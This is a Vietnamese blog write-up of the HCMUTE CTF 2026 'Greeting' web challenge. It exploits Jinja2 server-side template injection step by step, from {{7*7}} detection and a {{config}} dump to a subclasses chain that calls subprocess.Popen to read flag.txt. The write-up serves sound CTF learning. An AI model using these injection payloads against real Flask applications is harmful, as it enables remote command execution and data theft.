---
layout: single
title: "[Writeup] HCMUTE CTF 2026 - Greeting (SSTI)"
date: 2026-01-29
classes: wide
categories: [ctf, web]
tags: [hcmute, ssti, jinja2, rce, python]
permalink: /writeups/hcmute-ctf-greeting/
---

Tiếp tục với series HCMUTE CTF 2026, bài này có tên là **Greeting**.

## 1. Nhận diện mục tiêu

Tiêu đề bài này cực kỳ lộ liễu ngay trong mã nguồn: **SSTI Challenge**. Dựa trên kinh nghiệm của mình, đây chắc chắn là lỗ hổng **Server-Side Template Injection**.

Hệ thống yêu cầu nhập tên và hứa hẹn sẽ tiết lộ "bí mật". Điều này có nghĩa là giá trị mình nhập vào ô `name` sẽ được đưa vào một Template Engine (như Jinja2, Twig, hoặc Mako) ở phía server để hiển thị lời chào.

- **Tên lỗ hổng:** Server-Side Template Injection (SSTI).
- **Cơ chế:** Server nhận input từ người dùng, đưa vào template mà không qua bộ lọc, dẫn đến việc thực thi mã từ xa (RCE).
- **Dấu hiệu:** Tiêu đề `<title>SSTI Challenge</title>` trong file HTML.

## 2. Các bước khai thác (Payloads)

Đầu tiên, mình cần xác định xem Server đang dùng Template Engine nào.

### Bước 1: Kiểm tra tính toán (Detection)

Mình thử nhập: `{% raw %}{{7*7}}{% endraw %}`

Kết quả hiện ra là **Hello, 49!**. Điều này xác nhận 100% đây là lỗ hổng **SSTI**, và Server đang dùng **Jinja2** (thường đi kèm với Python Flask) vì cú pháp `{% raw %}{{ }}{% endraw %}` đặc trưng.

### Bước 2: Kiểm tra cấu hình hệ thống (Config)

Mình thử nhập `{% raw %}{{config}}{% endraw %}` để xem có gì "lạ" không:

```python
<Config {'SESSION_COOKIE_NAME': 'session', ... 'SECRET_KEY': '...'} >
```

Kết quả trả về xác nhận server đang chạy **Flask**. Tuy nhiên, Flag không nằm trong config. Mục tiêu tiếp theo là RCE để tìm file flag.

### Bước 3: Leo thang tìm RCE

Các payload đơn giản như `os.popen` đều bị lỗi 500 Internel Server Error. Có vẻ như Server đã chặn (WAF) hoặc cấu trúc object không cho phép gọi trực tiếp.

Mình chuyển sang kỹ thuật bypass bằng **Subclasses**. Thay vì dùng `self`, mình đi từ một object trống `[]`:

```python
{% raw %}{{ [].__class__.__base__.__subclasses__() }}{% endraw %}
```

Kết quả trả về một danh sách dài các class. Đây chính là "bản đồ" để mình tìm đường RCE.

Dựa vào danh sách này, mình tìm thấy class `subprocess.Popen` nằm ở vị trí (index) **363**. Đây là module cực mạnh trong Python cho phép thực thi lệnh hệ thống.

### Bước 4: Final Payload - Đọc Flag

Sau khi tìm được index `363` tương ứng với `subprocess.Popen`, mình xây dựng payload cuối cùng để đọc file `flag.txt`:

```python
{% raw %}{{ [].__class__.__base__.__subclasses__()[363]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip() }}{% endraw %}
```

Và kết quả là mình đã đọc được nội dung file flag thành công!

> Flag: `HCMUTE{...}` (Nội dung flag thực tế)

Bài này tuy cơ bản về SSTI nhưng yêu cầu kỹ năng recon và tìm kiếm class trong Python khá kỹ. Hy vọng writeup này giúp ích cho các bạn!
